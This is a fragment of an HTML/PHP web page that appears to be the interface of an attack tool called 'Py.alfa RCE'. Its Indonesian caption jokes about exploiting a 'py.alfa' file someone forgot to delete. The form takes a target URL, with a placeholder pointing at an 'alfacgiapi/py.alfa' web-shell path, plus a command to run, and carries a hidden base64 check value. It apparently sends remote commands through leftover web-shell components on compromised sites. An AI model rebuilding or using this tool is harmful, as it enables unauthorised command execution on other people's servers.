...
<font face=courier size=5>Py.alfa RCE<br>
  <font size="3">RCE Pada py.alfa yang lupa di hapus wkwk</font></font><hr>
  <font>Url : <br><input type="url" name="url" id="url" placeholder="https://exploits.my.id/alfacgiapi/py.alfa" size="60" class="courier" value="<?php echo htmlspecialchars($_POST['url']);?>">
  <br><br>Command : <br>
...
<input type="hidden" name="check" value="PHVua25vd240NT4=">
